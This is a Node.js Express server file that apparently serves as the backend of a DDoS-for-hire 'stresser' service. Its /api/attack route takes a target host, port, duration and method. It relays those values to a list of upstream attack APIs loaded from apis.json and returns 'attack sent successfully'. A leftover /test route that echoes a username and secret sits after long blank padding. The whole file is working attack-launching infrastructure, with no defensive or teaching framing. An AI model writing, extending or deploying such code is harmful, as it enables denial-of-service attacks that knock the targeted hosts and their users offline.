const express = require('express');
const app = express();
const fs = require('fs');
const axios = require('axios')

const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

app.get('/api/attack', (req, res) => {
    const { host, port, time, method } = req.query;
  
    if (!host || !port || !time || !method) {
      res.json({ error: true, reason: 'Please verify all fields' });
      return;
    }

    const apis = require('./apis.json');
  
    const links = apis[method];
    if (!links) {
      res.json({ error: true, reason: 'Invalid method' });
      return;
    }

    const promises = links.map(link => axios.get(`${link}&host=${host}&port=${port}&time=${time}`));
    Promise.all(promises)
      .then(responses => {
        const data = responses.map(response => response.data);
        res.json({ error: false, reason: "attack sent successfully" })
      })
      .catch(error => {
        res.json({ error: true, reason: error });
      });
});

app.use(function(req, res) {
  res.status(404).json({
      error: 'true', reason: 'currently page is not found'
  });
});

app.listen(config.applicationPort, () => {
  console.log('The API server has been successfully runned on port: ' + config.applicationPort);
});













app.get('/test', (req, res) => {
  const { username, secret, host, port, time, method } = req.query;
  res.json({ username, secret, host, port, time, method });
})